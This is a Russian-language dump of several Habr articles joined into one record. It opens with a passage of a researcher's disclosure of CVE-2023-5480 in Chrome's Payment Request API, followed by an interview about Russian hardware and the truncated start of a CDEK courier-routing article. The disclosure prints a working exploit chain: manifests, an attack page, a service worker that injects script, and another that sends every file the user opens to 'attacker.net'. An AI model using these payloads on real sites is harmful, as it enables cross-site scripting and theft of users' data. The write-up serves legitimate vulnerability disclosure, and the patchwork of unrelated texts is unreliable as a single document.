Соотвественно он скачает и установит Service Worker на заданном пути, перед запуском Payment App.Когда появилась уязвимостьPayment Request был реализован в Chromium в апреле 2018 года. Изначально было невозможно использовать уязвимость, которая будет описана далее.Читая исходный код код Chromium, я наткнулся, что фактически запрос манифеста был реализован на тот момент так:  headers->GetNormalizedHeader(""link"", &link_header);
  if (link_header.empty()) {
    // Fallback to HTTP GET when HTTP HEAD response does not contain a Link
    // header.
    FallbackToDownloadingResponseBody(final_url, std::move(download));
    return;
  }
То есть логика запроса представляла собой следущий алгоритм:Сначала проверяет заголовок Link с помощью rel=""pay-method-manifest"".Если он присутствует, загружаем это содержимое, заменив указанный URL-адрес.В противном случае просто используем содержимое определенного URL-адреса.И действительно, небольшое расследование показало, что 18 декабря 2019 года в Chromium была отправлена проблема с реализацией Payment Request:the spec (https://w3c.github.io/payment-method-manifest/#accessing) requires that besides looking for the ""Link"", the direct access over URL is also allowed - ""The machine-readable payment method manifest might be found either directly at the payment method identifier URL...."".То есть, человек указал, что в соответсвии со стандартами, мы можем передавать payment-manifest как по ссылке, так и по Link Header одновременноВ данный тикет была привлечена команда безопасности Chromium, которая одобрила изменения и спустя год, в марте 2020 года исправление стало доступно в стабильной ветки Chrome/ChromiumУязвимостьУязвимость стала возможной благодаря измению описанному в предыдущем пункте.Фактически мы имеем уникальную ситуацию, когда уязвимость появляется только при прямом следовании веб-стандартам. Так как при его разработке не был учтен один важный момент.Многие сайты реализуют функционал скачивания пользовательских файлов, т.e. мы имеем функционал вида:https://example.com/download?file=filename
https://example.com/download/filename
...
Такой функционал не должен представлять прямых рисков для безопасности, потому что выставляется Header:Content-Disposition: attachment
Таким образом, передаваемый файл будет загружен напрямую, что предотвращает возможность атак класса XSS. Это связано с тем, что невозможно передать пользователю файл с HTML-кодом для его отображения.Учитывая то, что Payments API начало считать файл из тела запроса, просто загрузим на целевой ресурс файлы:payment-manifest:{
    ""default_applications"": [""https://example.com/download/manifest.js""],
    ""supported_origins"": [""https://attacker.net""]
  }
manifest.js:{
    ""name"": ""PWNED"",
    ""short_name"": ""PWNED"",
    ""icons"": [{
        ""src"": ""/download/logo.jpg"",
        ""sizes"": ""49x49"",
        ""type"": ""image/jpeg""
    }],
    ""serviceworker"": {
      ""src"": ""/download/sw-slonser.js"",
      ""use_cache"": false,
      ""scope"":""/download/""
    },
    ""start_url"":""/download/index.html""
}
logo.jpg:* Логотип в формате JPEG *
На первый взгляд, может показаться, что это не слишком полезно, поскольку почему бы нам обрабатывать ответы, поступающие от Payments. Но здесь стоит вспомнить, как реализована коммуникация между нашим сайтом и Payment App - при помощи Service Workers.Мы можем указывать Service Worker в Payments, как я упомянул ранее, это обычный Service Worker, просто для него предусмотрены дополнительные события. Следовательно, ничто не мешает использовать стандартные возможности Service Worker.sw.slonser.jsself.addEventListener(""fetch"", (event) => {
    console.log(`Handling fetch event for ${event.request.url}`);
    let blob = new Blob([""<script>alert('pwned by Slonser')</script>""],{type:""text/html""});
    event.respondWith(new Response(blob));
  });
Данный скрипт перехватывает все запросы к сети и в ответ возвращает html:<script>alert('pwned by Slonser')</script>
После этого атакующему остается перевести атакуемого на свой домен, на котором расположен следующий код:attack.html<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Vsevolod Kokorin (Slonser) of Solidlab</title>
</head>
<body>
    <button onclick=""exploit()"">EXPLOIT</button>
    <script>
        function exploit(){
            const BASE = ""https://example.com/download"" // PATH TO DOWNLOAD SCOPE
            const fileName = 'payment-manifest.js' // Name of payment manifest
            const request = new PaymentRequest(
                [{ supportedMethods: `${BASE}/${fileName}` }],
                {
                    id: ""order-123"",
                    total: {
                    label: ""Total"",
                    amount: { currency: ""USD"", value: ""1.00"" },
                    }
                }
            );

            request.show().then((paymentResponse) => {
                    paymentResponse.complete(""success"").then(() => {
                });
            }).catch((e) => {
                    document.location = `${BASE}/C4T BuT S4D`;
            });
        }
    </script>
</body>
</html>
По заверешнию исполнения данного скрипта, атакуемый будет перенаправлен на целевой домен, где запрос перехватит зарегестрированный Service Worker (Потому что после JIT установки они не спадают). Соответсвенно мы получим XSS на заданом домене.Видео, которое я отправил гугл (на нем я получал XSS на сабдомене ngrok через свою страничку на Yandex S3):  ( Habr залагал и не у всех отображается, вот прямая ссылка ) Пример реальной атакиПри небольшом исследовании я сразу обнаружил применение данной атаки на многих популярных ресурсах. Описывать конкретно их я не буду, из-за этических соображений. (Так как миллионы пользователей ещё не обновили свои браузеры на основе Chrome) Но я нашел хороший пример для демонстрации данной атаки, а так же её ограничений - Gitlab. В данный момент атаку невозможно воспроизвести на последней версии сервиса, но она была эксплуатируема ещё год назад. Для примера, покажу эксплуатацию XSS с помощью данного бага, на Gitlab годовой давности:Создать gitlab репозиторий c СI/CD runners (или использовать готовый)Добавить в него свой CI, который создает artifact с нужными файлами:В нем я скачиваю архив с подконтрольного мне ресурса, и распаковываю данныеУбедиться, что данные действительно стали доступны на странице с артефактамиТеперь данные файлы можно скачать напрямую по ссылке:https://5604-185-219-81-55.ngrok-free.app/root/test/-/jobs/13/artifacts/raw/payment-manifest.js
Где test - идентификатор репозитория А 13 номер артефакта.Подставляем данную ссылку в страницу с эксплойтом которая была предоставлена в прошлом разделе, и размещаем её на подконтрольном нам ресурсеПолучаем испольнения нашего JS кода на домене с нашим гитлабомСейчас это не работает, потому что Gitlab возвращает artifacts с Content-Type: text/plain, так как выставление Content-Type: text/plain  вело к обходу CSP правила script-src: self. А регистрация Service Worker - проверяет Content-Type на принадлежность к Mime-Type Javascript.Соответсвенно уязвимым является любой ресурс, который реализует функционал загрузки/скачивания файлов, при этом не переписывает обычный Mime-Type файла.S3 bucketsДругим хорошим примером, являются S3 бакеты.Amazon S3 (Simple Storage Service) – это сервис облачного хранения данных от Amazon Web Services (AWS). S3 buckets представляют собой контейнеры для хранения файлов или объектов данных внутри Amazon S3.S3 бакеты по стандарту выставляют при скачивании Mime-Type по расширению файла. Для тех кто хочет подробнее что дает XSS на S3 бакетах, может посмотреть мой доклад. Если обобщить:Регистрируем service worker на домене с S3 бакетом:  async function handleRequest(event) {
    const attacker_url  = ""https://attacker.net?e="";
    
    let response = await fetch(event.request.url)

    let response_copy = response.clone();
    
    let sniffed_data = {url: event.request.url, data: await response.text()}

    fetch(
        attacker_url,
        {
            body: JSON.stringify(sniffed_data), 
            mode: 'no-cors', 
            method: 'POST'
        }
    )
  
    return new Response(await response_copy.blob(),{status:200})
  }
  

self.addEventListener(""fetch"",async (event) => {
    event.respondWith(handleRequest(event));    
});
Данный Service Worker будет дублировать все открываемые пользователем файлы на сервер атакующего.Общение с GoogleМногим будет интересна хронология моего общения с компанией Google, следовательно:13 октября 2023 года, я обнаружил данный недостаток14 октября 2023 года (суббота), я отправил сообщение с описанием недостатка в Chrome VRP17 октября 2023 года, сотрудники гугл начали разбирательства связанные с проблемой18 октября полностью разобрались с проблемой, недостатку был присвоен уровень опасности High19 октября был выпущен патч26 октября Google оценил мою находку в 16000$ (15000$ за саму уязвимость и 1000$ за идентификаию версии в которой уязвимость появилась)31 октября вышел Chrome 119, в котором недостаток был исправлен. Ему был присвоен идентификатор CVE-2023-5480Я, считаю что люди занимающиеся обеспечением безопасности Chromium действовали очень оперативно. А так же дали мне справедливое вознаграждение. Спасибо им за это.ИтогиИз этой истории можно вынести несколько выводов:Даже на уровне веб стандартов могут существовать ошибкиВ современных браузерах реализовано множество эксперементальных/не популярных Web APIOpen Source не спасает. Данный недостаток находился 3 года в открытом доступе, но его не смогли исправить. При этом он имеет довольно простую эксплуатацию (В отличии от других багов в Chromium, которые зачастую бинарные)Уязвимость не возникла бы, если бы разработчики не стали ""навешивать"" на готовые концепции новый функционал. Это хороший пример, к чему ведет метод ""костыля и велосипеда""",2024-01-26
"Разговор с Максимом Горшениным о мониторах «Лайтком», импортозамещении и производстве в РФ компьютерной техники",35,3,https://habr.com/ru/articles/788960/,"Идея взять интервью у блогера Максима Горшенина у меня была давно. Однако всё никак не мог найти повод: видео Максима давали большинство ответов на мои вопросы. И вот появилась причина, связанная с монитором «Лайтком» и чипом от «Миландра». Я решил — надо поговорить об этом и заодно задать ещё несколько вопросов. Так как материал получисля объёмным, я не стал делать длинным вступление. К тому же у нас получился долгий и интересный разговор, на мой взгляд. Почему ты стал блогером? До этого ты работал в компании МЦСТ, почему поменял сферу деятельности? Как раз блог и начался с компании МЦСТ. В МЦСТ я устроился в феврале 2015 года, через год создал youtube‑канал с FAQ по процессорам «Эльбрус», потому что я пришёл в компанию‑разработчик процессоров «Эльбрус» на должность специалиста по работе с клиентами. Клиенты часто задавали мне одни и те же вопросы. Я подумал: XXI век на дворе, стоит сделать видео в интернете на часто задаваемые вопросы. В 2016 году сделал. Да, есть теория заговора, что МЦСТ заставляет всех подписывать договор о неразглашении, разработки секретны и так далее. Это неправда, youtube‑канал изначально для этого и был создан — развеять мифы и помочь клиентам и заинтересованным лицам рассказать об «Эльбрусах».Я шёл по карьерной лестнице и начал ездить практически по всем мероприятиям, где участвовала МЦСТ и компания «Институт электронных управляющих машин имени Брука» («Инэум», входит в концерн «Автоматика», госкорпорации «Ростех» ). Про «Ростех» все знают, но у неё много предприятий и компаний, связанных с электроникой, о которых никто не осведомлён и не рассказывает. Пришла мысль — а почему бы и про них не рассказать и тем самым поддержать, тем более есть что показать. В итоге я отснял несколько роликов про разные компании и предприятия. В декабре 2021 года я решил уйти из МЦСТ. Параллельно сделал свой магазин. В 2022 году начал работать в другой компании, но было слишком много заказов в мой магазин. Я решил рискнуть, уйти в блог и магазин, и уволился. Почему решил продвигать российские решения?Весна 2022 года тоже сыграла свою роль. Тогда у всех была паника и ужас. Были настроения, что из электроники останутся паяльники и всё. Я знал, что это не так, и решил поддержать людей и записал в марте 2022 года «успокаивающий» ролик с 8 потенциальными путями выхода из сложившейся ситуации. Он получил положительный отклик. Поэтому с начала лета 2022 года я стал полноценным блогером с упором на технику от российских компаний.Насколько я понял, ты больше рассказываешь об аппаратной части, почему программная часть меньше обозревается; или мне кажется? Нет, тебе не кажется, это так. Я действительно больше обозреваю аппаратные решения. Всё просто. Я работал в компании разработчиков железа. И считаю первичной аппаратную часть. Есть разное мнение. Слышал от разных людей, включая некоторых из Министерства, что софт первичен, а железо — вторично. Софт надо писать, а железо потом приземлим, разработаем, давайте останемся на Китае. Я с этим категорически не согласен, без аппаратной части нельзя говорить о технологической независимости (сложно доверять чужой «железке», на которой свой софт). Недокументированные возможности, бэкдоры в железе и так далее. Скандалов ещё до 2022 года много было с железом и бэкдорами.Ну, про софт каждый может рассказывать, это легко говорить, тем более про какие‑нибудь вещи софтовые, связанные с какими‑нибудь веб‑серверами, отечественными базами данных. Однако если нормально тестировать и показывать, то в этом нужно разбираться, с этим нужно работать, а я с этим не работал. Например, показать работу баз данных Postgres на «Эльбрусе» у меня не получится, я не работал с Postgres. С железом работал и про него могу рассказывать и показать. Но есть оговорка — операционные системы я ещё отношу всё‑таки больше к железу. В них делают упор на железо, в том или ином виде, а прикладной софт — это не моя история. Пример с «Открытой мобильной платформой». Появился запрос от госов на российскую защищённую ОС для смартфонов под госслужащих ещё до 2022 года. И после 2022 года уже были наработки. Как раз Аврора сделана для определённого количества поставщиков с конкретным железом. Ну а говорить про верхнеуровневый софт или даже игры — этого контента много, и много кто делает хорошо и качественно, я в этой нише точно лишний. Бывают исключения: у меня есть материал про Smart Engines. Так что иногда я рассказываю про российский софт, но только в котором разобрался сам.Ты стараешься обозревать все российские аппаратные решения, связанные с IT и электроникой, или только те, что входят в реестр Минпромторга?Я обозреваю тех, кто действительно что‑то делает, на реестре всё не зацикливается, к нему не привязываюсь. Есть заблуждение у людей, поэтому будет небольшое разъяснение.Важная информация: когда я говорю, условно, что надо переходить на наши «Эльбрусы», то появляется сильный негатив, предполагается, что рядовому пользователю придётся переходить с условного Macbook (у которого передовой процессор) на российский ноутбук с непонятным Эльбрусом (не самый передовой процессор). Я в каждом ролике и не только в ролике объясняю — это про импортозамещение и госзакупки на бюджетные деньги. Рядового пользователя государство не ограничивает в использовании каких‑либо аппаратных или программных платформ. Исключение составляют программы и железо, наносящие вред самим жителям РФ. Мне тоже неважно, чем будет пользоваться обычный человек дома, если ему удобно и комфортно, например, на Маке. Мои основные подписчики представляют собой людей, взаимодействующих с государством (работники госструктур, госслужащие, разработчики отечественных систем и так далее). Они core‑аудитория, поэтому говорю я про переход для них. Кстати, дома они тоже могут Маками пользоваться не по рабочим вопросам.Твой онлайн‑магазин представляет собой возможность рекламы для отечественных фирм или создан для заработка? Ты убрал бы из магазина продукцию, которая оказалась бы «переклеенным китайцем»?Когда я работал в МЦСТ, было очень много запросов: хотим купить Эльбрус. Я говорил с руководством, мне дали добро, я организовал. Однако Эльбрусы — не самый ходовой товар: за полгода его купит один человек максимум (цена всё‑таки кусачая). Поэтому я решил сделать магазин с российскими разработками, причём не на словах, а на деле. Ну и оговорюсь, это не значит, что в магазине 100% созданные в РФ товары, это значит, всё, что можно произвести в России, в товаре произведено. Например, в магазине есть SSD компании GS. Память сами кристаллы они не производят, но в Калининграде из пластин с производства нарезают память и корпусируют уже у нас в стране. А это уже хорошо, больше, чем многие.Но магазин не приносит больших заработков, он просто на самоокупаемости (плата за онлайн‑кассу, бухгалтерии, логистика, обслуживание юридического счёта, уплата налогов и так далее). Открою коммерческую тайну (секрет Полишинеля) наценка в магазине минимальная: около 10% — 15%. К сожалению, себестоимость наших производителей выше китайцев, нельзя поставить в убыток российскую продукцию. Можно, конечно, но магазин быстро закроется. К примеру, если выходить на Willberries, надо ставить наценку 60%. Или можно закупать у китайцев монитор стоимостью ₽15 тысяч, а продавать за ₽56 тысяч, даже без российского логотипа. Но таким я не хочу заниматься. Лучше, если покупатель захочет российский монитор, он зайдёт в мой магазин и купит действительно российский монитор по рекомендованной розничной цене от производителя. Что касается второй части вопроса — да. Такого пока не было. Мне прислали машинную зарядку со словами: вот русская зарядка, сами делаем. Я в ролике показал, рассказал. Только меня обманули. Компания НИИЭТ подсунула зарядку, у которой нет российских транзисторов. По этому поводу даже общались с генеральным директором. Видео выложено. Ну и в ходе долгого разговора с генеральным директором НИИЭТ он признался, что у его компании нет зарядок с применением наших транзисторов и не было. Возможно, будут когда‑нибудь, но не факт. И вообще, в этих зарядках нет наших разработок. Когда присылали, меня убеждали, что есть. Я даже уточнил: в зарядке действительно российские транзисторы, разработки НИИЭТ — и мне заявили — да. Я несколько раз уточнял, попросил дать ссылку на эти транзисторы. У них даже в официальных соцсетях написано, что это автомобильные зарядки, внутри которых транзисторы российской разработки. В итоге я прорекламировал российскую бытовую электронику, где нет ничего российского. Потом выпустил видео с опровержением и разбором этой зарядки. А расскажи поподробнее, что случилось с зарядкой? Компания‑производитель пришла ко мне, рассказала, что у них российская зарядка. При первом рассмотрении было всё нормально, я им поверил и сделал ролик. Но позднее обман вскрылся, а меня использовали как медиалицо для продвижения своей продукции. Мне выдали перемаркированную зарядку, где была нанесена лазером гравировка на китайских чипах — логотип российской компании. Они же и про транзисторы знали. Точнее, что в ней вообще другая схема используется. Я общался с генеральным директором НИИЭТ на эту тему. Он меня уверял, что всё проверили. Я спросил: раз вы проверили зарядку и дали мне её в разобранном виде, значит, какой‑то ваш специалист стирал гравировку с китайских элементов, наносил логотип вашей компании, видел другую схемотехнику, но вас обманул. Или мне заведомо дали подложную, неправильную информацию и подсунули другое устройство. Генеральному директору вопрос не понравился, и он ушёл от ответа. Современная отечественная техника, на твой взгляд, сейчас больше такая неведомая зверушка для энтузиастов, ниша для продажи в госведомства и госкомпании оборудования, развивающаяся отрасль или возможность перепродажи зарубежных решений под российскими названиями?Начну издалека; до 2018 года это была перепродажа китайцев под российским лейблом. Процессоры «Эльбрус» и «Байкал» появились в то же время или чуть позже. И в то время это была такая диковинка для интересующихся. Купил, поигрался и оставил как раритет. Например, за весь 2014 год персональных компьютеров на базе процессоров «Эльбрус» было продано 104 или чуть больше, а госструктуры ПК закупают в год сотнями тысяч. Просто сравнение: 100 тысяч на Intel и 100 на Эльбрусах. Это даже на погрешность мало тянет. Поэтому до 2020-х годов российские процессоры были интересной зверушкой для энтузиастов. В 2022–2023 годах ситуация изменилась кардинально. С 2022 года государство старается локализовать российских разработчиков,чтобы они свою продукцию производили на территории РФ. К примеру, «Бештау» организовали производство в стране, стараются тут локализовать всё, что можно. Компания Aquarius занялась «приземлением» производства в России — уже 2 завода на территории нашей страны, где самостоятельно делают поверхностный монтаж. 10 лет назад такое было сложно представить, чтобы кто‑то свои линии монтажа открыл, свои разработчики сами что‑то делали. Это было только под очень специализированные нужды, а устройства делал в объёме 2–3 в год. Расходы, включая зарплаты сотрудников, аренды и так далее в эти же 2–3 устройства закладывались, что делало цену решения огромной. Сейчас я вижу, что стало нормой у компаний разрабатывать самостоятельно и производить самостоятельно устройства в РФ. Борьба, естественно, идёт среди тех, кто возит из Китая почти всё и тех, кто старается локализовать производство в РФ. Хотя бы то, что можно тут производить. Однако есть распоряжение правительства: с 1 января 2024 года вся техника, которая находится в реестре и покупается на бюджетные деньги, должна быть с компонентами (например, платы) из российского текстолита. Этот текстолит должен быть сделан на российском заводе. В 2023 году было требование, что поверхностный монтаж должен быть российский. Постепенно государство толкает производителей к локализации производства. Для страны это значит рабочие места, налоги, производство электронной компонентной базы. Возможно, далее уже начнётся использование российских резисторов, конденсаторов, и это уже будет больше похоже на российскую разработку. И уже будет сложно завозить из Китая, не нарушая законодательства РФ или продвигая свои устройства с китайскими комплектующими с добавленными бесполезными компонентами как российский компьютер.Правда, российские процессоры «Эльбрус» и «Байкал» мы выносим за скобки. К сожалению, они стали меньшей диковинкой, но всё равно ею остаются. Их закупают российские госструктуры, например, РЖД или МВД. Но даже закупка в 1 тысячу машин не даёт повсеместного распространения, как у техники с зарубежными процессорами.Скажи, а ты как‑то поменял свои взгляды насчёт российской электроники?Да. Когда я работал в МЦСТ, я говорил, что я признаю российской только технику с российским процессором. В 2022 году у меня очень сильно поменялась парадигма устройств, которые я считаю российскими. Теперь для меня российская техника — та, которая проходит хоть какие‑то этапы производства в РФ. Например, тот же самый поверхностный монтаж, производимый на заводах в РФ. Или другой пример, SSD: да, основа для памяти зарубежная, но создание диска — нарезка платы, напайка и корпусирование — делается в нашей стране. Такие производители, которые стараются сделать побольше локализации производства в стране, приносят больше пользы. Это работа специалистов, повышение компетенций для создания устройств, сами рабочие места — создание компетенций для развития технологий, Одно дело — купить готовую уже напаянную память, и другое дело — купить составные части и производить в РФ. Поэтому любую компанию, создающую такие компетенции в стране, я считаю российской. И то, что, например, устройства Intel, меня это не волнует. Главное, что постепенно идут процессы приземления и локализации. И государство тоже в этом участвует. И если тенденция продолжится, то рано или поздно всем придётся перейти к наибольшему количеству отечественного оборудования российских устройств.Как ты вышел на мониторы «Лайтком» и на то, что у них есть «ненужная» плата?Начну издалека. С 1 января 2021 года все системы хранения данных, по закону РФ включённые или включаемые в реестр оборудования, обязали быть только на российских процессорах. За год до этого, в начале января 2020 года, в МЦСТ выстроилась очередь из компаний, чтобы предзаказать российские процессоры. Сумма сделок выходила на ₽1 млрд. Причём очередь была и к «Байкалу». Во всех наших российских разработчиках была одинаковая ситуация. Только вот от момента заказа процессора до его получения выходило 8 месяцев, и надо было внести 100% предоплаты. Однако все ждали, стояли в очереди. И тут появляется автономная некоммерческая организация «Вычислительная техника» сокращённо АНО «ВТ», и предлагает ввести балльную систему. По ней будет определённый ценз баллов, дающий возможность признать решение российским или нет. Однако реальным инициатором этого была компания Yadro. Достаточно посмотреть учредителей АНО «ВТ» и учредителей Yadro.АНО «ВТ» предлагает сделать с 1 января 2021 года балльную систему до 2024 года. Потому что сейчас идут разработки серверного процессора для систем хранения данных на базе открытой архитектуры RISC‑V, и он как раз появится в 2024 году. Давайте отложим обязательное введение применения российского процессора до 2024 год.Причём на тот момент проблемы балльной системы были в том, что при признании сервера или системы хранения данных российской достаточно было взять зарубежное устройство, приделать плату с 3 контроллерами российского производства, и оно набирало нужные для прохождения в реестр баллы. Когда мы, те кто боролся против фейковых чипов на платах с процессором Intel, поняли, что почти проиграли и балльную систему в том виде, которая была вредна для российских разработчиков процессоров должны были вот‑вот принять, я предложил последний рывок. Сделать фильм про эту ситуацию у блогера Станислава Васильева. Его заинтересовала эта тема, ему тоже не понравилась идея, что хотят по сути «убить» Байкалы и Эльбрусы, и Станислав снял документальный фильм по ситуацию вокруг балльной системы. И благодаря этому фильму введение удалось отсрочить на 1,5 года.И вот мы переносимся в 2023 год, и я вижу подтверждение этим словам. На Хабре я увидел статью про мониторы, где в одном из них приделан российский контроллер в плате управления. И за этот контроллер монитор набрал больше всех своих конкурентов баллы и стал «самым российским» по баллам. И хоть в статье говорилось, что российский контроллер выполнял роль центральной микросхемы, которая все делает, но в статье ошиблись.Поэтому история имеет длинные корни, а монитор — один из ярких представителей, а не расследование блогера, который решил срубить просмотров.При этом никакого полезного функционала российская микросхема на плате не несёт. Я делал ролики в первую очередь про сам монитор и внезапный непонятный чип. Причём в первом ролике я говорил, что компания ничего не нарушает, сама балльная система имеет «бэкдор». Повторяюсь, тогда я говорил: «Лайтком» ничего не нарушил, но такое ли импортозамещение нужно? Сама компания «Лайтком» и «Миландр» начали отвечать через СМИ, что я не разобрался, чип нужный и монитор внесён раньше балльной системы в реестр. Я решил копнуть глубже. Вспомнил, что в 2021 году в реестр вносили без балльной системы. Про ЦП и реестр я уже говорил ранее. Из‑за проблем с ЦП как раз этот монитор судорожно начали пихать в реестр, причём в документах при подаче в Торгово‑Промышленную Палату РФ называли этот контроллер от «Миландра» центральным процессором. Однако сейчас говорится, что это не центральный процессор, а центральный контроллер, и в мониторе он главный, а не чип Realtek. Цель моих роликов — не словить популярность и хайп, а показать, что в стране есть производство. Причём производство локализованное, пусть не из своих пока комплектующих. Да и было уже с зарядкой.После рассказа о «Лайтком» и «Миландра» было ли давление со стороны этих компаний? Были ли другие компании, которые отказались с тобой работать? Ничего такого не было, ни звонков, ничего не было. От других каких‑то компаний тоже отказов или ещё чего‑то не было. Да у меня и нет таких заказчиков. Я же вообще небольшой блогер, каких‑то больших и длительных рекламных контрактов ни с кем нет. Существуют ли сейчас российские компьютеры и периферия для домашнего пользования (которую можно купить домой)?Из того, что сегодня есть на рынке и чтобы много российского внутри, и чтобы ещё и домой поставить, сразу навскидку не приходит. Пожалуй, только монитор «Бештау» и клавиатура от них же. И не потому что они есть у меня в магазине, и я их пиарю. Просто цена монитора «Бештау» и какого‑нибудь китайского с похожими характеристиками плюс‑минус одинаковая будет. Однако у китайских фирм нет замены монитора. То есть, даже если один пиксель вышел из строя или засвет — «Бештау» меняют монитор. Без каких‑либо разговоров. Ну и они отвечают моему критерию локализации производства. Матрица у них, естественно, зарубежная, но корпус и схемотехника самостоятельные, поверхностный монтаж схемотехники самостоятельный (скалер, который отвечает за управление, блоки питания и так далее). Прошивка, управляющая монитором, своя собственная. Часть подставок для монитора они в России делают, упаковка своя (коробка и ложементы), ну и, как я сказал, пластиковый корпус.А что‑нибудь в ближайшее время может выйти из персональных компьютеров или ноутов на российских процессорах? Я надеюсь на ноутбук Bitblaze, компания «Промобит» называется, они на процессоре «Байкал‑М». Однако характеристики там — 8 ядер, 1,5 Гц, видео встроенное, у которого тоже 8 ядер. И сам процессор не для мобильных устройств, он будет горячий, поэтому автономной работы 12 часов от ноутбука не стоит ждать. Ну и самое важное — цена от ₽150 тысяч. Правда, такую цену объявляли в 2022 году. Значит надо ещё инфляцию накинуть, сейчас примерная цена в ₽200–230 тысяч.И скажем так, это будет не Macbook. И не потому что я этот ноутбук считаю плохим, просто условный ноутбук с возможностями Macbook на российском процессоре будет стоить полмиллиона рублей по себестоимости производства. Bitblaze собирались делать из титана ограниченную серию корпусов, цену они называли в районе 300 тысяч рублей всё тогда же, два года назад. Сейчас есть некоторые сложности, связанные с наличием процессоров, потому что предзаказ из государственных учреждений никто не оставил. Это никому не интересно. Российский ноутбук на российском процессоре за 150 тысяч экономически не выгоден. На Intel можно купить за 30–40 тысяч рублей, и он тоже в реестре будет. К тому же, российские ноутбуки на российском процессоре интересно производить от тысячи штук, чтобы себестоимость была 150 тысяч рублей. Ну и по экспоненте — 10 тысяч ноутбуков — цены будут ниже 100 тысяч рублей, 50 тысяч ноутбуков — ещё дешевле. Но пока таких заказов нет.Что нужно для того, чтобы мы пришли к адекватной цене техники, например ноутбуков?Чтобы прийти к адекватной стоимости российской электроники (действительно российской), надо чтобы рынок сбыта у нас был не 150 млн человек, а хотя бы 300 млн. Всё упирается в население Российской Федерации. Мы упираемся в рамки своей страны, поэтому производство электроники не отбивается, включая заводы по производству процессоров. Потребности процессоров в России один завод сможет удовлетворить примерно за полгода, а остальные полгода чем этот завод будет заниматься? Надо людям зарплату выдавать, за электричество платить, обслуживать оборудование, оно без этого не проживёт. И это касается всех других элементов электроники, например резисторов, транзисторов, контроллеров, тачей для ноутбуков. Можно наладить линию, начать производить ЭКБ, но потребность страны будет удовлетворена очень быстро. Или вот, например, тонер для принтера если производить. У нас его столько не потребляют в России, чтобы делать промышленные установки дешёвого создания тонера. Того, который сможет конкурировать по стоимости с Китаем. С рынком сбыта электроники и сопутствующих товаров проблемы. Для этого надо либо кратно увеличивать площадь страны, либо срочно начинать думать о демографии и повышать население на 50–60 тысяч в месяц. Чтобы население резко увеличилось, и всё окупилось. Есть ещё вариант заниматься поставками в другие страны. Однако в том же Китае обычный НДС 15% для предпринимателей, а в Российской Федерации — 20%. В Китае льготный кредит в 5–6%. В России получить льготный кредит на строительство завода очень сложно. Поэтому надо идти в обычный банк и брать под 20% годовых. Кроме того, Китаю не нужно так много тратить деньги на частные сооружения, как если бы ты строил схожее предприятие в РФ. И в итоге получается неравная конкуренция компьютера с процессором Intel с материнкой, произведённой в России, и компьютера, произведённого с тем же с процессором Intel и той же материнкой, произведённые в Китае. Естественно, не получится объём производства. Я считаю, что в дружественных странах (Сирии, Иране, Северной Корее, Кубе и прочих) не надо строить заводы. Надо на территории РФ строить заводы по производству компьютерной техники, а в дружественные страны её экспортировать. Тогда мы сможем загрузить производство на 100%, обеспечить потребности своей страны и союзных государств, а также удовлетворить потребности в заводах и предприятиях.Даже если представить идеальные условия. Вот, гипотетически, появился завод по производству «Эльбрусов» на территории Российской Федерации по технологии 7 нанометров. Естественно, появится много комментариев: а толку что вы делаете процессор в России, станки‑то не российские. Ладно, создаём собственный станок. Для его создания нужно предприятие. Прикидываем, сколько надо литографов в год для страны — примерно 10 штук. И вот мы их произвели, вернее, у нас есть фабрика с 10 литографами, они закрыли все нужды по печати процессоров. На второй год что делать с этим заводом, который производит эти литографы? В итоге надо людей увольнять, потому что ещё 10 литографов не нужны в стране, а платить людям зарплату в убыток или задерживать: заказы на литографы закончились. Или сокращать до штата, способного сделать один литограф в год для поддержки рабочего состояния остальных, плюс делать какие‑то плановые улучшения. Когда начинаешь производить станки для производства чего‑то российского, то ты упираешься в нехватку населения. Покупать созданные станки вряд ли будут за рубежом. Например, Китай сам их делает. Да у Китая‑то станки и внутри страны, и во всём мире расходятся. Вообще конкурировать с китайским производством очень сложно по экономическим условиям, потому что в разных условиях мы живём, даже в поясах климатических и затратах. На мой взгляд, единственный вариант конкуренции — создать собственную архитектуру процессора, которая будет выгодно отличаться. И вот тогда будут покупать российскую технику, причём эта архитектура или какая‑то её отличительная черта должна быть настолько удобной всем, что конкурировать с ней будет невозможно. Или этот процессор будет без недокументированных возможностей из США и Китая, как, например, «Эльбрус». И вот уже такую технику производить на заводах в нашей стране. И после этого появится рынок сбыта для техники и не только техники, для всего, даже для российской химии. Поэтому пока рынок сбыта 150 млн человек, мы, к сожалению, выжимаем максимум из того, что есть. Хорошо, что у нас хотя бы это всё идёт и движется. Государство обеспечивает спрос, и слава богу, что по таким ценам, по которым получается производить в стране. Пока делал это интервью, с интересом его перечитывал, некоторые вещи спорные, однако идеи мне понравились. И во многом я согласен с ними. Тем более, 10 лет назад я сам работал в компании, занимающейся импортозамещением, и очень расстраивался, что, имея какую‑никакую сборочную линию, компания практически переклеивала шильдики. Надеюсь, что локализация производства у российских компаний продолжится. ",2024-01-26
"Как мы с помощью ML вылечили проблему, не дававшую перейти на автомаршрутизацию курьеров",32,1,https://habr.com/ru/companies/cdek_blog/articles/788816/,"Привет, Хабр! Меня зовут Наталья Макарова, я ведущий разработчик команды геоданных в CDEK. В этой статье расскажу, как мы с помощью ML решили проблему, не дававшую нашей компании перейти на автоматическую маршрутизацию курьеров. Мы умеем отслеживать прохождение грузом всей транспортной цепочки, включая промежуточные склады. Но посылку нужно ставить на конкретный маршрут до того, как весь груз придет на склад доставки. И даже до того, как он попадет в ERP‑систему СDEK (посылки оформят в офисах). То есть задача такая: определить, на какой маршрут поставить конкретный заказ до того, как появился сам маршрут! Статья будет полезна:  участникам продуктовых команд — продактам, аналитикам, ведущим разработчикам — для пополнения «копилки кейсов» решения задач с нечеткими требованиями и демотивированными стейкхолдерами;специалистам из логистической сферы.СодержаниеСбор анамнезаКак сейчас? Автоматизированная система управления маршрутамиДиагностикаДиагнозЛечениеПредпланированиеПрохождение маршрутаВыводСбор анамнезаМаршрутизация курьеров — это распределение доставок и забора грузов (заявок) по курьерам, а также планирование оптимальных маршрутов с учетом пробок, интервалов доставки, срочности и очередности.Подробнее про заявкиУ нас в компании есть процесс, когда курьера вызывают по адресу, и он забирает посылку для последующего отправления адресату. Это и есть заявка. Заявки заранее неизвестны. Они создаются уже в то время, когда курьеры работают на маршрутах. Задача маршрутизатора посчитать, на какой маршрут и в какое время поставить эту заявку.Это распределение может быть обеспечено системой управления одного из следующих типов (тому, кто изучал теорию систем, следующий абзац будет знаком).Ручная система — без использования ЭВМ. Знаете, как почта в 19 